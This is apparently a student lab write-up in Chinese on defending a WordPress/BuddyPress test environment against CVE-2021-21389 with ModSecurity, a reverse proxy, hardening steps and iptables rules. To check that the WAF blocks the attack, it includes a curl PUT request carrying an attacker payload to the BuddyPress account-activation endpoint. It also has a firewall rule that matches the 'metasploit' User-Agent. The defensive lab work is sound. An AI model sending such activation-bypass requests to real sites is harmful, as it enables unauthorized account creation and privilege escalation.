| 注册绕过（直接激活账户） | 第二条规则 | 拦截 `/wp-json/buddypress/v1/signup/activate/<activation_key>` 的请求 |

如果条件满足，**ModSecurity 将阻断请求，并记录日志。** 这种方式可以有效防御 CVE-2021-21389 漏洞利用行为。

3. 重启Apache：
   ```bash
   sudo systemctl restart apache2
   ```

---

#### 5. 监控和日志分析
启用ModSecurity的日志功能，记录所有拦截的请求，便于后续分析。

##### 配置日志

1. 编辑ModSecurity配置文件：
   ```bash
   sudo vim /etc/modsecurity/modsecurity.conf
   ```

2. 确保日志路径正确：
   ```bash
   SecAuditLog /var/log/apache2/modsec_audit.log
   ```
   - SecAuditLog 指令用于指定 ModSecurity 审计日志的存储路径。
   - /var/log/apache2/modsec_audit.log 是默认的日志文件路径，记录所有拦截的请求及其详细信息。
3. 重启Apache：
   ```bash
   sudo systemctl restart apache2
   ```


#### 6. **配置 Apache2 监听 `81` 端口**
编辑 Apache 的配置文件：
```bash
sudo vim /etc/apache2/ports.conf
```
将 `Listen 80` 改为 `Listen 81`。
![1748236550489](image/readme/1748236550489.png)
编辑虚拟主机配置文件：
```bash
sudo vim /etc/apache2/sites-available/000-default.conf
```
将 `<VirtualHost *:80>` 改为 `<VirtualHost *:81>`。
![1748236586413](image/readme/1748236586413.png)
重启 Apache：
```bash
sudo systemctl restart apache2
```

---

#### 7. **配置反向代理**
启用 Apache 的反向代理模块：
```bash
sudo a2enmod proxy
sudo a2enmod proxy_http
```
- a2enmod 命令用于启用 Apache 模块。
proxy 和 proxy_http 模块用于实现反向代理功能。
- 编辑虚拟主机配置文件：
```bash
sudo vim /etc/apache2/sites-available/000-default.conf
```
在 `<VirtualHost *:81>` 块中添加以下内容：
```bash
<VirtualHost *:81>
    ProxyPreserveHost On
    ProxyPass / http://127.0.0.1:23509/
    ProxyPassReverse / http://127.0.0.1:23509/
</VirtualHost>
```
![1748183339649](image/readme/1748183339649.png)

重启 Apache：
```bash
sudo systemctl restart apache2
```
- Apache 将开始监听 81 端口，并将所有请求通过反向代理转发到 23509 端口。


- **目前的拓扑图:**
```bash
+-------------------+       +-------------------+       +-------------------+
|      Client       | ----> |     WAF (Apache   | ----> |   Target Server   |
|    (curl 请求)    |       |   + ModSecurity)  |       | (Wordpress 测试环境) |
+-------------------+       +-------------------+       +-------------------+
        |                           |                           |
        | 1. 发送请求到 81        | 2. iptables 重定向到 23509    | 3. 处理请求
        | ------------------------> | ------------------------> |
        |                           |                           |
        |                           | 4. 拦截恶意请求             |
        |                           | (返回 403 Forbidden)       |
        | <------------------------ |                           |
        |                           |                           |
        |                           | 5. 记录日志                |
        |                           | (modsec_audit.log)         |
```

---

#### 8. **测试 WAF 是否拦截恶意请求**
```bash
 curl -X PUT -d '{"user_login": "attacker5", "user_email": "attacker5@163.com", "user_name": "attacker5", "password": "attacker5"}' http://192.168.20.12:81/wp-json/buddypress/v1/signup/activate/2pnXFe3HAC3A5SPWCf5OPbWd3LVO3C
```
- 通过 curl 命令向 81 端口发送一个提权的请求。
- 如果 WAF 配置正确，应该返回 403 Forbidden，表示请求被拦截。
- 如果请求被拦截，ModSecurity 会在日志文件中记录详细的请求信息。
![1747959087953](image/readme/1747959087953.png)
![1747963376713](image/readme/1747963376713.png)

# 入口漏洞修复

### 一.环境准备
#### 1.下载kali
 推荐一个下载kali镜像很快的网站：https://mirrors.aliyun.com/kali-images/kali-2024.4/?spm=a2c6h.25603864.0.0.732b571caXKqrs
![](./image/0.png)
#### 2. 下载和配置docker
![](./image/2.png)
![](./image/3.png)
#### 3. 拉取 VulFocus 漏洞镜像
![](./image/7.png)
#### 4. 启动 VulFocus 容器
![](./image/9.png)
### 二.修复漏洞
#### 1.手动安装 / 更新 BuddyPress 插件至7.2.1
![](./image/10.png)
![](./image/11.png)
#### 2.# 禁用危险REST端点
![](./image/12.png)
#### 3.文件上传防护
在 wp-config.php 中添加配置
![](./image/13.png)
![](./image/14.png)
DISALLOW_UNFILTERED_HTML 设置为 true 可以禁止未过滤的 HTML 上传，增强安全性；  
WP_ALLOW_MULTISITE 设置为 false 可以禁用 WordPress 多站点功能
#### 4.限制上传文件类型
![](./image/16.png)
这段代码的作用是匹配扩展名为 .php、.phtml 和 .phar 的文件，然后禁止所有来源对这些文件的访问，从而防止恶意上传可执行脚本文件。添加完成后，保存并关闭文件。
#### 5.API 权限控制
![](./image/17.png)
wp role reset subscriber 命令用于重置 subscriber 角色的权限到默认状态；    
wp cap remove subscriber read 命令用于移除 subscriber 角色的 read 能力，进一步限制其对网站内容（包括 /wp-json 相关 API ）的访问权限。
#### 6.添加日志配置内容
![](./image/18.png)
这部分配置定义了一种新的日志格式 sec_audit ，包含客户端 IP（%h ）、远程用户名（%l ）、认证用户名（%u ）、请求时间（%t ）、请求行（%r ）、状态码（%>s ）、响应大小（%b ）、引用页（%{Referer}i ）和用户代理（%{User-Agent}i ）等信息，并指定将符合该格式的日志记录到 /var/log/apache2/security_audit.log 文件中。
#### 7.防火墙设置
下载防火墙
![](./image/19.png)
添加规则
![](./image/20.png)
第一条命令创建了一个名为 WPAPI 的最近连接记录集，用于跟踪访问 80 端口（HTTP 端口 ）的 TCP 连接。第二条命令设置在 60 秒内，如果同一个源 IP 对 80 端口的访问次数达到 10 次，就丢弃后续的连接请求，以此限制 REST API 的访问频率，防止恶意高频访问。
阻断异常 User-Agent
![](./image/21.png)
该命令使用字符串匹配模块（-m string ），采用 bm 算法（--algo bm ），当检测到请求中的 User-Agent 字段包含 metasploit 时，就丢弃该请求，从而阻断可能来自恶意工具的访问。
### 三.修复验证
自动化测试脚本
![](./image/22.png)
这段代码使用 curl 命令向 http://localhost:8080/wp-json/buddypress/v1/signup 发送一个 POST 请求，携带注册用户的相关信息（用户名、邮箱、密码 ），模拟攻击者尝试利用注册绕过漏洞进行注册。
结果：
![](./image/24.png)




## 参考资料

[教学课件](https://c4pr1c3.github.io/cuc-ns-ppt/vuls-awd.md.v4.html#/%E5%BB%BA%E7%AB%8B%E7%AB%8B%E8%B6%B3%E7%82%B9%E5%B9%B6%E5%8F%91%E7%8E%B0%E9%9D%B6%E6%A0%872-4)
[教学视频【网络安全(2023) 综合实验】](https://www.bilibili.com/video/BV1p3411x7da?vd_source=e1f7434c660a15bfac556224e06c742a)
[教学视频【第六章 网络与系统渗透】](https://www.bilibili.com/video/BV1qV41127Xv?p=10&vd_source=e1f7434c660a15bfac556224e06c742a)